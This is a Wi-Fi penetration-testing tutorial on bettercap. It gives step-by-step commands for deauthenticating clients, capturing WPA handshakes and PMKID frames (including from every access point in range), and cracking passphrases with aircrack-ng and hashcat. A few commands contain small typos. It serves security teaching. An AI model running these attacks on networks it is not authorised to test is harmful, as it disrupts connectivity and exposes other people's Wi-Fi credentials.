<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/wireless-penetration-testing/" rel="category tag">Wireless Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Wireless Penetration Testing: Bettercap</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/wireless-penetration-testing-bettercap/" rel="bookmark"><time class="entry-date published" datetime="2021-07-11T17:07:06+00:00">July 11, 2021</time><time class="updated" datetime="2025-05-10T17:39:54+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <h3><span style="color: #800000;"><strong>Introduction</strong></span></h3>
<p><span style="color: #000000;">According to its official repository <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/bettercap/bettercap">here</a></strong></span>, bettercap is a powerful, easily extensible and portable framework written in Go that aims to offer to security researchers, red teamers and reverse engineers an <strong>easy to use</strong>, <strong>all-in-one solution</strong> with all the features they might possibly need for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, wireless HID devices and Ethernet networks. In this article, we’d be seeing how to use bettercap to aid with Wi-Fi pentesting.</span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ol>
<li><span style="color: #000000;">Installation</span></li>
<li><span style="color: #000000;">Monitor mode and discovery</span></li>
<li><span style="color: #000000;">Sorting filters</span></li>
<li><span style="color: #000000;">Deauth attack using bettercap</span></li>
<li><span style="color: #000000;">PMKID attack using bettercap</span></li>
</ol>
<h3><span style="color: #800000;"><strong>Installation</strong></span></h3>
<p><span style="color: #000000;">To install bettercap, we’d use:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install bettercap</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nGR9veEQaO8/YOsgz0xOWfI/AAAAAAAAxbA/tUvtaxPVe4Eq_sKLv6Di-eI6_OI8F0yjwCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">After installation, you can <strong data-start="138" data-end="155" data-is-only-node="">easily access</strong> the <strong data-start="160" data-end="173">main menu</strong> by typing in:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bettercap</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pRSl10OVGg0/YOsg6lBW2yI/AAAAAAAAxbE/5m6rYpTZMFocDlW1AF4ShsUlHHnxPQ3fwCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Now to navigate your way around this tool for all the Wi-Fi testing related options, the help page is available at</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">help wifi</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7o7t9PHyppo/YOsg_gdSceI/AAAAAAAAxbI/A10vAqM0bGYpWZeWWY2kAynxyjws7bDvgCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Now, This tool requires an older version of the pcap library so, we’ll first download that using wget.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://old.kali.org/kali/pool/main/libp/libpcap/libpcap0.8_1.9.1-4_amd64.deb
dpkg -i libpcap0.8_1.9.1-4_amd64.deb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-T5clTC7EnLw/YOshEDoWy2I/AAAAAAAAxbQ/PldkqifN8pg6D6Wa3ztumrQgczY17eoDACLcBGAsYHQ/s16000/4.png"/></span></p>
<h3><span style="color: #800000;"><strong>Monitor Mode and Wi-Fi discovery</strong></span></h3>
<p><span style="color: #000000;">Monitor mode is a promiscuous mode for your IEEE802.11x receiver (aka Wi-Fi adapter or Wi-Fi NIC) and lets you capture signals from not only your access point but others as well. To put your Wi-Fi adapter in promiscuous mode:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bettercap -iface wlan0mon</pre>
<p><span style="color: #000000;">To start discovering Access Points around you:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wifi.recon on</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p2g7fyszpP8/YOshJCiNSdI/AAAAAAAAxbU/oQK9ltaWUj0jlQF7kWzT7TE51UzHRMtewCLcBGAsYHQ/s16000/5.png"/></span></p>
<h3><span style="color: #800000;"><strong>Sorting filters</strong></span></h3>
<p><span style="color: #000000;">Often times knowing the vendor of an access point aids us in checking access point against known vulnerabilities. To do this we can use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set wifi.show.manufacturer true
wifi.show</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8bg3XIfADI0/YOshNKruJaI/AAAAAAAAxbc/s42dBF0rwAICldGDu4AmbpPwo0xT3PCmwCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">As you can see we are now able to see a majority of the manufacturers of access points around me. Now, what if I want to see the access points in descending order of the clients connected to it. As we already know that deauth attacks work on APs with clients to capture a handshake and hence, having more clients catalyses the capture process. So, for that we have:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set.wifi.show.sort clients desc
wifi.show</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BJGID6IUTwU/YOshRGWEQsI/AAAAAAAAxbg/GBtMCbtO7603lZlCb93JG_ZR5uL8gWdxgCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">As you can see the APs have arranged themselves in descending order of a number of clients connected.</span></p>
<p><span style="color: #000000;">Let’s do the same with ESSID too and arrange it in ascending order.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set.wifi.show.sort essid asc
wifi.show</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-m7A3EwyrQh4/YOshUpaSl1I/AAAAAAAAxbo/njuxGQ68q1EiswDfEYFnk7K32SP2QFcTACLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Additionally, you can now <strong data-start="222" data-end="242" data-is-only-node="">see hidden SSIDs</strong> popping up. The angular bracket is considered before A-Z because it is a <strong data-start="316" data-end="334">special symbol</strong>.</span></p>
<p><span style="color: #000000;">Now, what if we want to limit the results to only, let’s say, the top 3? To do this:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set wifi.show.limit 3
wifi.show</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TM2sfQWmHNE/YOshaO0ZDvI/AAAAAAAAxbw/ibAV65ABrBYqDY22B-PmMo9RW8HlrtzPACLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Therefore, we’ve <strong data-start="361" data-end="384" data-is-only-node="">limited the results</strong> to only the top 3. <strong data-start="404" data-end="412">Next</strong>, let’s send <strong data-start="425" data-end="453">deauthentication packets</strong> to <strong data-start="457" data-end="474">open networks</strong>. Open networks are those which aren’t protected by a passphrase.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set wifi.deauth.open true</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-k0SgPsoH2tQ/YOshgiI48tI/AAAAAAAAxb0/QAOFwJHbBx0AmpBdKn_4utnUtKEwv_lZQCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">In this case, we can observe that <strong data-start="582" data-end="604" data-is-only-node="">clients from 2 APs</strong> have been deauthenticated.</span></p>
<h3><span style="color: #800000;"><strong>Deauth attacks using Bettercap</strong></span></h3>
<p><span style="color: #000000;">We have already seen how to recon, sort and filter. Let’s conduct a short deauth attack on an access point.</span></p>
<p><span style="color: #000000;">First, put your wifi adapter in monitor mode</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SI44RVK1JdA/YOshm6mWq8I/AAAAAAAAxcA/I0ftKcuPE8gTQ16kAPXNKJGN-1DYX0YbwCLcBGAsYHQ/s16000/51.png"/></span></p>
<p><span style="color: #000000;">Now, we’ll first put up the list of APs found:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">events.stream off
wifi.show</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rfyW3pTctO8/YOshs-0861I/AAAAAAAAxcE/viTnfu08y-sBIZiNDaj2pOGY5SO3ifJXgCLcBGAsYHQ/s16000/52.png"/></span></p>
<p><span style="color: #000000;">Note that events.stream is a logging feature in <strong data-start="688" data-end="701" data-is-only-node="">Bettercap</strong> that shows logs, new hosts being found, etc. By default, it is enabled, but to provide a clear output, we can turn it off.</span></p>
<p><span style="color: #000000;">Now, we’ll attack on AP “raaj.”</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set wifi.recon.channel 5
set net.sniff.verbose true
set net.sniff.filter ether proto 0*888e
set net.sniff.output wifi.pcap
set net.sniff on
wifi.deauth 18:45:93:69:a5:19
events.stream on</pre>
<p><span style="color: #000000;">It is operating on channel 5 and we’d first put our adapter to listen on channel 5.</span></p>
<p><span style="color: #000000;">By setting <strong>sniff.verbose</strong> to true, every captured and parsed packet will be sent to the <strong>events.stream</strong> for displaying.</span></p>
<p><span style="color: #000000;">Next, the <strong>net.sniff.filte</strong>r ether proto 0*888e sets the sniffer to capture EAPOL frames. <strong>0*888e</strong> is the standard code for EAPOL (IEEE 802.11X frames).</span></p>
<p><span style="color: #000000;">Output file is set to wifi.pcap</span></p>
<p><span style="color: #000000;"><strong>net.sniff</strong> on turns the bettercap sniffer on</span></p>
<p><span style="color: #000000;"><strong>wifi.deauth</strong> starts sending deauth packets to the specified MAC ID (BSSID) of the access point</span></p>
<p><span style="color: #000000;"><strong>events.stream on</strong> turns the logging on and now bettercap will run in verbose mode.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6zCSOd9YFzs/YOsh1BgpgRI/AAAAAAAAxcM/CF5qQoe1nF0AhKzTMFR0Nu4Hj9cCmlNMgCLcBGAsYHQ/s16000/54.png"/></span></p>
<p><span style="color: #000000;">As you can see, the client has reauthenticated after being deauthenticated by bettercap and a handshake has been captured</span></p>
<p><span style="color: #000000;">Now, we’ll use aircrack-ng to crack hashes captured in this handshake file. We’ve already written an article on aircrack-ng for your reference <a style="color: #000000;" href="https://www.hackingarticles.in/wireless-penetration-testing-aircrack-ng/">here</a>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">aircrack-ng bettercap-wifi-handshakes.pcap -w /root/dict.txt</pre>
<p><span style="color: #000000;">Here, dict.txt is a long password file containing the most commonly used passwords and passwords I generated given the knowledge I have about my target.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R7_UXJyNrOc/YOsh_nCCRPI/AAAAAAAAxcU/HxRSz6Ycneo4PrBtVNSkYeMWz-WB_3QQwCLcBGAsYHQ/s16000/56.png"/></span></p>
<p><span style="color: #000000;">And just like that, we have cracked the Wi-Fi passphrase of “raaj.”</span></p>
<h3><span style="color: #800000;"><strong>PMKID Attack using Bettercap</strong></span></h3>
<p><span style="color: #000000;">We’ve discussed in detail PMKID and PMKID attacks in this article <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack/">here</a></strong></span>. Now, let’s see a small tutorial where a bettercap can be used to conduct PMKID attacks.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bettercap
set wifi.interface wlan0mon
wifi.recon on</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-b_-ZmoQktfg/YOsiEnOcsVI/AAAAAAAAxcY/Hcvtppuxio0YQYtNdLlZeInBdCP9kAGhgCLcBGAsYHQ/s16000/105.png"/></span></p>
<p><span style="color: #000000;">Let’s see the target APs available</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wifi.show</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ibzNJ5FyG5I/YOsiLuD82uI/AAAAAAAAxcg/O58jthf_qpE6mM_xKjwXIktdJXGGCMV8wCLcBGAsYHQ/s16000/106.png"/></span></p>
<p><span style="color: #000000;">For the PMKID attack to work we have to send an association request to the target Access Point. We do this with:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wifi.assoc &lt;BSSID&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fw2FNZasIN8/YOsiRtPSbtI/AAAAAAAAxco/2Ozmy1kXugMDuPKCrE4KnAQlEdQRN23OACLcBGAsYHQ/s16000/107.1.png"/></span></p>
<p><span style="color: #000000;">As we can see, we have successfully received the RSN frame containing PMKID and it has been saved in a pcap format. What is I want to send an association request to all the Wi-Fis available. To do that the command is:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wifi.assoc all</pre>
<p><span style="color: #000000;">And yes, all the vulnerable routers returned the RSN frame containing PMKID and it got saved in a pcap file.</span></p>
<p><span style="color: #000000;">Now we can use the hcxpcaptool to convert this pcap file in Hashcat crackable format and use Hashcat to crack the PMK hash.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">hcxpcaptool -z hashpmkid bettercap-wifi-handshakes.pcap
hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show</pre>
<p><span style="color: #000000;">Here, 16800 is the code for PMKID WPA/WPA2 hash type. We have used the rockyou dictionary here.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zMHc0XWseN4/YOsiZOY1KRI/AAAAAAAAxcw/2BosnmRcdGM3UtuFlW1nWqLR_qtJO8DMgCLcBGAsYHQ/s16000/108.png"/></span></p>
<p><span style="color: #000000;">And it’s so simple. Bettercap is a sniffer with many other such functionalities besides Wi-Fi packet sniffing. We hope that this article helped you in developing opinions about tools available in the market today and forging your own Wi-Fi security audit toolkit. Thanks for reading. Have a nice day.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact<strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
